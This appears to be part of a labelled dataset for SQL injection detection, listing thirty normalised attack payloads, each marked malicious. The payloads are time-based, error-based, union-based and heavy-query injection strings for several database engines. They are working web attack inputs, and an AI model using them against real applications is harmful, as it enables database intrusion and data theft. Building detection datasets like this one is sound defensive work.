row_index,payload_norm,label,sqli_type_hint
3120,1' and sleep ( 5 ),1,
3121,"1"" ) where 6956 = 6956 or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,
3122,"1%"" ) ) and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( ""%"" = """,1,
3123,"1', ( select ( case when ( 5433 = 5433 ) then 1 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual )",1,
3124,"1' or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,
3125,"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( ( '%' = '",1,
3126,select case when 4176 = 6138 then 1 else null end--,1,
3127,"1"" ) as hfvz where 7186 = 7186 union all select null,null,null,null,null,null#",1,
3128,"-3461"" ) ) union all select 6342,6342,6342,6342,6342,6342#",1,
3129,-5134 ) ) ) or 8571 = 8571--,1,
3130,"1' ) and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( 'wfws' = 'wfws",1,
3131,"1' ) ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) and ( 'ylit' like 'ylit",1,
3132,"-3856"" ) as iyzl where 7394 = 7394 or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --",1,
3133,"1 ) as czeu where 1738 = 1738 or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) --",1,
3134,"1"" ) ) ) or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #",1,
3135,"-9456%"" ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ""%"" = """,1,
3136,"-1168 ) ) as vlol where 3475 = 3475 or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",1,
3137,"select * from generate_series ( 7407,7407,case when ( 7407 = 6562 ) then 1 else 0 end ) limit 1--",1,
3138,select ( case when ( 3681 = 5989 ) then 3681 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,1,
3139,-9143 ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ),1,
3140,"-8614' ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",1,
3141,"1' ) ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( 'nvsy' like 'nvsy",1,
3142,1%' ) ) and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( '%' = ',1,
3143,"1"" ) where 5814 = 5814 and 6969 = ( select 6969 from pg_sleep ( 5 ) ) --",1,
3144,1' ) where 2763 = 2763,1,
3145,1' where 8770 = 8770 union all select null--,1,
3146,"1"" where 8918 = 8918 ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) --",1,
3147,"1'|| ( select 'vsfg' where 3547 = 3547 and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) ) ||'",1,
3148,"1' and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and 'rxdz' = 'rxdz",1,
3149,1'+ ( select 'vnue' where 5807 = 5807,1,
